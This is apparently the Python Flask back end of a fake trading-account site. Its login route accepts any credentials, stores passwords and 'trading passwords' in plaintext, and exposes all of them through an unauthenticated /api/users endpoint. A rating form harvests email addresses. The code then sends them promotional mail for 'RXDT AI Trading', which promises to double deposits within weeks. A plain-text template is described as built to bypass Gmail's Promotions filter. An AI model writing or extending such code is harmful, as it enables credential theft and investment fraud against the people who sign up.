# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from flask_cors import CORS
import psycopg2
import psycopg2.extras
import os
from datetime import datetime
import resend

# Simple local helper to load .env file if it exists
def load_env():
    env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '.env')
    if os.path.exists(env_path):
        with open(env_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '=' in line:
                    key, val = line.split('=', 1)
                    os.environ[key.strip()] = val.strip()

load_env()
resend.api_key = os.environ.get('RESEND_API_KEY')

if not resend.api_key:
    print("WARNING: RESEND_API_KEY environment variable is not set. Rating reminder emails will not be sent.")

app = Flask(__name__)
CORS(app)

# Neon PostgreSQL connection string (Set this in Vercel Environment Variables)
DATABASE_URL = os.environ.get('DATABASE_URL')


def get_db():
    """Get a connection to the Neon PostgreSQL database."""
    conn = psycopg2.connect(DATABASE_URL)
    return conn


def get_setting(key, default_value='true'):
    """Fetch setting value from settings table."""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL
            )
        ''')
        conn.commit()
        cursor.execute('SELECT value FROM settings WHERE key = %s', (key,))
        row = cursor.fetchone()
        conn.close()
        return row[0] if row else default_value
    except Exception:
        return default_value


def set_setting(key, value):
    """Set or update setting value in settings table."""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL
            )
        ''')
        cursor.execute('''
            INSERT INTO settings (key, value)
            VALUES (%s, %s)
            ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value
        ''', (key, str(value)))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print("Error saving setting:", e)
        return False


def init_db():
    """Initialize the Neon database and create the users and signup_users tables."""
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            login_type TEXT NOT NULL,
            email TEXT,
            phone_number TEXT,
            password TEXT NOT NULL,
            trading_password TEXT,
            remember_password INTEGER DEFAULT 0,
            created_at TEXT NOT NULL
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS signup_users (
            id SERIAL PRIMARY KEY,
            signup_type TEXT NOT NULL,
            email TEXT,
            phone_number TEXT,
            password TEXT NOT NULL,
            trading_password TEXT,
            invite_code TEXT,
            created_at TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()


def ensure_signup_table():
    """Ensure the signup_users table exists (called on first request)."""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS signup_users (
                id SERIAL PRIMARY KEY,
                signup_type TEXT NOT NULL,
                email TEXT,
                phone_number TEXT,
                password TEXT NOT NULL,
                trading_password TEXT,
                invite_code TEXT,
                created_at TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()
    except Exception:
        pass


# Ensure signup_users table exists on startup
ensure_signup_table()


@app.route('/api/signup', methods=['POST'])
def signup():
    """Handle signup form submission and save details to the signup_users table."""
    data = request.get_json()

    signup_type = data.get('signup_type', 'email')
    email = data.get('email', '')
    phone_number = data.get('phone_number', '')
    password = data.get('password', '')
    trading_password = data.get('trading_password', '')
    invite_code = data.get('invite_code', '')
    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not password:
        return jsonify({'success': False, 'message': 'Password is required'}), 400

    if signup_type == 'email' and not email:
        return jsonify({'success': False, 'message': 'Email is required'}), 400

    if signup_type == 'phone' and not phone_number:
        return jsonify({'success': False, 'message': 'Phone number is required'}), 400

    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO signup_users (signup_type, email, phone_number, password, trading_password, invite_code, created_at)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
        ''', (signup_type, email, phone_number, password, trading_password, invite_code, created_at))
        conn.commit()
        conn.close()

        return jsonify({'success': True, 'message': 'Account created successfully'}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500



@app.route('/api/login', methods=['POST'])
def login():
    """Handle login form submission. Check signup_users first for authentication,
    otherwise save details to the users table."""
    data = request.get_json()

    login_type = data.get('login_type', 'email')
    email = data.get('email', '')
    phone_number = data.get('phone_number', '')
    password = data.get('password', '')
    trading_password = data.get('trading_password', '')
    remember_password = 1 if data.get('remember_password', False) else 0
    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not password:
        return jsonify({'success': False, 'message': 'Password is required'}), 400

    if not trading_password:
        return jsonify({'success': False, 'message': 'Trading password is required'}), 400

    if login_type == 'email' and not email:
        return jsonify({'success': False, 'message': 'Email is required'}), 400

    if login_type == 'phone' and not phone_number:
        return jsonify({'success': False, 'message': 'Phone number is required'}), 400

    try:
        conn = get_db()
        cursor = conn.cursor()

        # First, check if credentials match a signup_users record
        if login_type == 'email':
            cursor.execute(
                'SELECT id FROM signup_users WHERE email = %s AND password = %s',
                (email, password)
            )
        else:
            cursor.execute(
                'SELECT id FROM signup_users WHERE phone_number = %s AND password = %s',
                (phone_number, password)
            )

        signup_match = cursor.fetchone()

        if signup_match:
            # Credentials match a signed-up user - redirect to dashboard
            conn.close()
            return jsonify({'success': True, 'redirect': 'dashboard', 'message': 'Login successful'}), 200
        else:
            # Auto-register new user directly into signup_users table
            cursor.execute('''
                INSERT INTO signup_users (signup_type, email, phone_number, password, trading_password, invite_code, created_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            ''', (login_type, email, phone_number, password, trading_password, '', created_at))

            # Also log to users table
            cursor.execute('''
                INSERT INTO users (login_type, email, phone_number, password, trading_password, remember_password, created_at)
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            ''', (login_type, email, phone_number, password, trading_password, remember_password, created_at))

            conn.commit()
            conn.close()

            return jsonify({'success': True, 'redirect': 'dashboard', 'message': 'Account created and logged in successfully'}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500



@app.route('/api/rating', methods=['POST'])
def save_rating():
    """Handle rating and feedback submission."""
    data = request.get_json()

    rating = data.get('rating', 0)
    feedback = data.get('feedback', '')
    email = data.get('email', '')
    phone_number = data.get('phone_number', '')
    created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not rating or int(rating) < 1 or int(rating) > 5:
        return jsonify({'success': False, 'message': 'A star rating between 1 and 5 is required'}), 400

    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ratings (
                id SERIAL PRIMARY KEY,
                rating INTEGER NOT NULL,
                feedback TEXT,
                email TEXT,
                phone_number TEXT,
                created_at TEXT NOT NULL
            )
        ''')
        # Add columns if they don't exist
        cursor.execute('ALTER TABLE ratings ADD COLUMN IF NOT EXISTS email TEXT')
        cursor.execute('ALTER TABLE ratings ADD COLUMN IF NOT EXISTS phone_number TEXT')
        cursor.execute('ALTER TABLE ratings ADD COLUMN IF NOT EXISTS email_sent BOOLEAN DEFAULT FALSE')

        # Check if auto_send is enabled globally
        auto_send_enabled = get_setting('auto_send', 'true').lower() == 'true'

        email_sent_status = False
        if auto_send_enabled and email and '@' in email:
            email_sent_status = send_reminder_email(email, template_type='text')

        cursor.execute('''
            INSERT INTO ratings (rating, feedback, email, phone_number, email_sent, created_at)
            VALUES (%s, %s, %s, %s, %s, %s)
        ''', (int(rating), feedback, email, phone_number, email_sent_status, created_at))
        conn.commit()
        conn.close()

        return jsonify({'success': True, 'message': 'Rating saved successfully', 'email_sent': email_sent_status}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


def send_reminder_email(email, template_type='html'):
    """Send transactional reminder email via Resend API.
    
    template_type:
    - 'text': Pure text/plain 1-to-1 personal email format (Zero HTML, single link) to bypass Gmail Promotions tab.
    - 'html': Full rich visual template.
    """
    if not email or '@' not in email:
        return False
    try:
        if template_type == 'text':
            subject = "QVSE account note"
            text_body = """Hi,

Thanks for rating QVSE earlier.

Here is the direct link to set up your RXDT Account:
https://www.rxdt.site/#/register?invite=RXN2ZO

If you have any questions or need guidance, feel free to reply directly to this email.

Best,
QVSE Team"""

            resend.Emails.send({
                "from": "QVSE Team <noreply@qvsespp.site>",
                "to": email,
                "subject": subject,
                "text": text_body,
                "headers": {
                    "Reply-To": "support@qvsespp.site"
                }
            })
        else:
            subject = "Your exclusive RXDT access is waiting! Create your account now"
            html_content = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Your RXDT Exclusive Access</title>
</head>
<body style="margin:0;padding:0;background-color:#0a0f1e;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <div style="max-width:600px;margin:0 auto;padding:24px 16px;">

    <!-- Header -->
    <div style="text-align:center;padding:24px 0 16px;">
      <div style="font-size:28px;font-weight:900;letter-spacing:2px;color:#ffffff;">QVSE</div>
      <div style="font-size:13px;color:#64748b;margin-top:4px;letter-spacing:1px;text-transform:uppercase;">Exclusive Member Access</div>
    </div>

    <!-- Hero: Primary CTA -->
    <div style="background:linear-gradient(135deg,#1a1f35,#0f1628);border:1px solid rgba(255,215,0,0.25);border-radius:16px;padding:32px 24px;text-align:center;margin-bottom:20px;">
      <div style="font-size:36px;margin-bottom:12px;">&#x1F680;</div>
      <h1 style="margin:0 0 10px;font-size:24px;font-weight:900;color:#ffd700;line-height:1.2;">
        Create Your RXDT Account Now
      </h1>
      <p style="margin:0 0 24px;font-size:15px;color:#94a3b8;line-height:1.6;">
        As a valued QVSE member, you have <strong style="color:#ffffff;">exclusive access</strong> to RXDT AI Trading &mdash; start with as little as <strong style="color:#ffd700;">$100</strong> and grow your capital faster than ever.
      </p>
      <a href="https://www.rxdt.site/#/register?invite=RXN2ZO"
         style="display:inline-block;padding:16px 36px;background:linear-gradient(135deg,#ffd700,#e5b610);color:#111827;font-weight:800;font-size:17px;text-decoration:none;border-radius:50px;box-shadow:0 8px 24px rgba(255,215,0,0.35);letter-spacing:0.3px;">
        &#x1F680;&nbsp; Create RXDT Account
      </a>
      <p style="margin:16px 0 0;font-size:12px;color:#475569;">
        Your referral link: rxdt.site/#/register?invite=<strong style="color:#ffd700;">RXN2ZO</strong>
      </p>
    </div>

    <!-- Community Links -->
    <div style="background:#0f1628;border:1px solid rgba(255,255,255,0.07);border-radius:14px;padding:20px 20px 8px;margin-bottom:20px;">
      <p style="margin:0 0 14px;font-size:13px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">
        &#x1F4AC;&nbsp; Join Our Community
      </p>
      <!-- WhatsApp - first -->
      <a href="https://chat.whatsapp.com/CypiIGGCDea7CBNpfxJ9dk?s=cl&amp;p=a&amp;ilr=1"
         style="display:block;text-align:center;padding:13px;background:rgba(37,211,102,0.1);border:1.5px solid rgba(37,211,102,0.4);border-radius:10px;color:#25d366;text-decoration:none;font-weight:700;font-size:14px;margin-bottom:10px;">
        &#x1F4AC;&nbsp; Join WhatsApp Group
      </a>
      <!-- Telegram Group -->
      <a href="https://t.me/+iIx0d1qCg3syYzE0"
         style="display:block;text-align:center;padding:13px;background:rgba(0,136,204,0.1);border:1.5px solid rgba(0,136,204,0.4);border-radius:10px;color:#4db8ff;text-decoration:none;font-weight:700;font-size:14px;margin-bottom:10px;">
        &#x2708;&#xFE0F;&nbsp; Join Telegram Group
      </a>
      <!-- CEO DM -->
      <a href="https://t.me/RXDT888"
         style="display:block;text-align:center;padding:13px;background:rgba(0,136,204,0.1);border:1.5px solid rgba(0,136,204,0.4);border-radius:10px;color:#4db8ff;text-decoration:none;font-weight:700;font-size:14px;margin-bottom:12px;">
        &#x1F464;&nbsp; Message CEO @RXDT888 on Telegram
      </a>
    </div>

    <!-- Bonus Box -->
    <div style="background:rgba(255,215,0,0.07);border:1px solid rgba(255,215,0,0.25);border-radius:14px;padding:18px 20px;text-align:center;margin-bottom:20px;">
      <div style="font-size:22px;margin-bottom:6px;">&#x1F381;</div>
      <p style="margin:0;font-size:15px;font-weight:700;color:#ffd700;">Welcome Deposit Bonus</p>
      <p style="margin:8px 0 0;font-size:14px;color:#d4a800;line-height:1.6;">
        Get up to <strong>$100 bonus</strong> on your first deposit &mdash; plus up to <strong>3 free spins</strong> where you can win up to <strong>$50!</strong>
      </p>
    </div>

    <!-- Growth Plans -->
    <div style="background:#0f1628;border:1px solid rgba(255,255,255,0.07);border-radius:14px;padding:20px;margin-bottom:20px;">
      <p style="margin:0 0 14px;font-size:13px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;">
        &#x1F4C8;&nbsp; Choose Your Growth Plan
      </p>
      <div style="margin-bottom:10px;padding:12px 14px;background:rgba(255,255,255,0.02);border-radius:8px;border-left:4px solid #cd7f32;">
        <strong style="color:#fff;font-size:14px;">&#x1F949; Starter &mdash; From $100</strong><br>
        <span style="font-size:13px;color:#64748b;">1 daily signal. Double your capital in under 2 months (or ~30 days with 1 referral).</span>
      </div>
      <div style="margin-bottom:10px;padding:12px 14px;background:rgba(255,255,255,0.02);border-radius:8px;border-left:4px solid #c0c0c0;">
        <strong style="color:#fff;font-size:14px;">&#x1F948; Growth &mdash; From $300</strong><br>
        <span style="font-size:13px;color:#64748b;">2 daily signals. Double your capital in under 30 days.</span>
      </div>
      <div style="padding:12px 14px;background:rgba(255,255,255,0.02);border-radius:8px;border-left:4px solid #ffd700;">
        <strong style="color:#fff;font-size:14px;">&#x1F947; Pro &mdash; $1,000+</strong><br>
        <span style="font-size:13px;color:#64748b;">3 daily signals. Double your capital in just 3 weeks.</span>
      </div>
    </div>

    <!-- Congratulations Context -->
    <div style="background:#0f1628;border:1px solid rgba(255,255,255,0.07);border-radius:14px;padding:20px;margin-bottom:20px;">
      <div style="font-size:22px;margin-bottom:8px;">&#x1F3C6;</div>
      <h2 style="margin:0 0 8px;font-size:17px;font-weight:700;color:#ffffff;">Thank You for Rating QVSE!</h2>
      <p style="margin:0;font-size:14px;color:#64748b;line-height:1.7;">
        As a <strong style="color:#94a3b8;">trusted and valued QVSE member</strong>, your feedback means everything to us. This email is a reminder of the exclusive RXDT AI Trading opportunity that was shared with you after you submitted your rating. We want to make sure you don't miss out!
      </p>
    </div>

    <!-- Footer -->
    <div style="text-align:center;padding-top:16px;border-top:1px solid rgba(255,255,255,0.06);">
      <p style="margin:0;font-size:12px;color:#334155;">QVSE &copy; 2026. All rights reserved.</p>
      <p style="margin:6px 0 0;font-size:11px;color:#1e293b;">
        You received this because you rated QVSE. If you wish to unsubscribe, reply to this email.
      </p>
    </div>

  </div>
</body>
</html>"""

            resend.Emails.send({
                "from": "QVSE Team <noreply@qvsespp.site>",
                "to": email,
                "subject": subject,
                "html": html_content,
                "headers": {
                    "Reply-To": "support@qvsespp.site"
                }
            })
        return True
    except Exception as mail_err:
        print("Resend error: " + str(mail_err))
        return False


@app.route('/api/admin/settings', methods=['GET', 'POST'])
def admin_settings():
    """Get or update global admin settings (like auto_send)."""
    if request.method == 'GET':
        auto_send_val = get_setting('auto_send', 'true').lower() == 'true'
        return jsonify({'success': True, 'auto_send': auto_send_val}), 200

    if request.method == 'POST':
        data = request.get_json() or {}
        auto_send = data.get('auto_send', True)
        success = set_setting('auto_send', 'true' if auto_send else 'false')
        if success:
            return jsonify({'success': True, 'auto_send': bool(auto_send)}), 200
        else:
            return jsonify({'success': False, 'message': 'Failed to save setting'}), 500


@app.route('/api/admin/ratings', methods=['GET'])
def get_admin_ratings():
    """Retrieve all ratings submitted (for admin display)."""
    try:
        conn = get_db()
        cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)

        # Create table/columns checks first just in case
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ratings (
                id SERIAL PRIMARY KEY,
                rating INTEGER NOT NULL,
                feedback TEXT,
                email TEXT,
                phone_number TEXT,
                created_at TEXT NOT NULL
            )
        ''')
        cursor.execute('ALTER TABLE ratings ADD COLUMN IF NOT EXISTS email TEXT')
        cursor.execute('ALTER TABLE ratings ADD COLUMN IF NOT EXISTS phone_number TEXT')
        cursor.execute('ALTER TABLE ratings ADD COLUMN IF NOT EXISTS email_sent BOOLEAN DEFAULT FALSE')
        conn.commit()

        cursor.execute('SELECT * FROM ratings ORDER BY created_at DESC')
        rows = cursor.fetchall()
        conn.close()

        ratings = [dict(row) for row in rows]
        return jsonify({'success': True, 'ratings': ratings}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/api/admin/send-email', methods=['POST'])
def admin_send_email():
    """Manually send or resend the reward email to a specific rating user (supports type='text' or 'html')."""
    data = request.get_json()
    rating_id = data.get('id')
    template_type = data.get('type', 'html')

    if not rating_id:
        return jsonify({'success': False, 'message': 'Rating ID is required'}), 400

    try:
        conn = get_db()
        cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
        cursor.execute('SELECT * FROM ratings WHERE id = %s', (rating_id,))
        rating_row = cursor.fetchone()

        if not rating_row:
            conn.close()
            return jsonify({'success': False, 'message': 'Rating not found'}), 404

        email = rating_row.get('email')
        if not email or '@' not in email:
            conn.close()
            return jsonify({'success': False, 'message': 'User rating does not have a valid email address'}), 400

        # Attempt to send email
        success = send_reminder_email(email, template_type=template_type)

        if success:
            # Update database
            cursor.execute('UPDATE ratings SET email_sent = TRUE WHERE id = %s', (rating_id,))
            conn.commit()
            conn.close()
            return jsonify({'success': True, 'message': f'Email ({template_type.upper()}) sent successfully'}), 200
        else:
            conn.close()
            return jsonify({'success': False, 'message': 'Resend delivery failed. Check your API configurations.'}), 500

    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


@app.route('/api/users', methods=['GET'])
def get_users():
    """Retrieve all saved login entries (for admin/debugging)."""
    try:
        conn = get_db()
        cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
        cursor.execute('SELECT * FROM users ORDER BY created_at DESC')
        rows = cursor.fetchall()
        conn.close()

        users = [dict(row) for row in rows]
        return jsonify({'success': True, 'users': users}), 200
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500


if __name__ == '__main__':
    print('Server running at http://localhost:5000')
    app.run(debug=True, host='0.0.0.0', port=5000)
